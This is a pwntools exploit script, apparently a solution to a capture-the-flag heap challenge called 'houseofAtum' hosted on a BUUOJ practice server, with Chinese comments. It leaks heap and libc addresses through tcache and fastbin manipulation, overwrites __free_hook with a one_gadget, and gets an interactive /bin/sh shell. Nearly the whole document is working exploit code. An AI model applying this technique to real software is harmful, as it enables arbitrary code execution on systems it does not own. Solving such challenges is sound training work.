from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

debug = 1

one_gadget = 0x4f322 
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

if debug:
    io = process('./houseofAtum')
else:
    io = remote('node4.buuoj.cn',28310)

def p():
    gdb.attach(proc.pidof(io)[0])

def new(content):
    io.sendlineafter(b"Your choice:",b'1')
    io.sendafter(b"content:",content)

def edit(idx,content):
    io.sendlineafter(b"Your choice:",b'2')
    io.sendlineafter(b"the idx:",str(idx))
    io.sendafter(b"the content:",content)

def delete(idx,clear):
    io.sendlineafter(b"Your choice:",b'3')
    io.sendlineafter(b"the idx:",str(idx))
    io.sendlineafter(b"Clear?(y/n):",clear)

def show(idx):
    io.sendlineafter(b"Your choice:",b'4')
    io.sendlineafter(b"the idx:",str(idx))

# leak heap
new(b'A')
new(p64(0)*7+p64(0x11)) #伪造0x91的chunk的邻接的下一个chunk的head
delete(1,b'y')
for i in range(6):
    delete(0,b'n')
p()
show(0)
io.recvuntil(b'\x3a')
heap_addr = u64(io.recv(6).ljust(8,b'\x00'))
success("heap_addr --->"+hex(heap_addr))

# leak libc
delete(0,b'y') # 进fastbin
new(p64(heap_addr-0x20)) # notes[0] = heap_addr 
new(b'a')
delete(1,b'y')
new(p64(0)+p64(0x91)) # note[1]=heap_addr-0x10,把notes[0]的size改成了0x91
for i in range(7):  #填满tcache
    delete(0,b'n')
delete(0,b'y')      #进unsorted bin
edit(1,b'a'*0x10)
show(1)
io.recvuntil(b'a'*0x10)
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x3ebca0
success("libc_base --->" + hex(libc_base))

# hook hijack
free_hook = libc.symbols['__free_hook'] + libc_base
edit(1,p64(0)+ p64(0x51)+ p64(free_hook-0x10) )
new('a') #伪造的chunk在new出来的chunk的bk，所以malloc完伪造的chunk就进tcache
delete(0,b'y') #free_hook-0x10这个chunk(是
one_gadget += libc_base
new(p64(one_gadget))
io.sendlineafter(b"Your choice:",b'3')
io.sendlineafter(b"he idx:",b'1')

io.interactive()

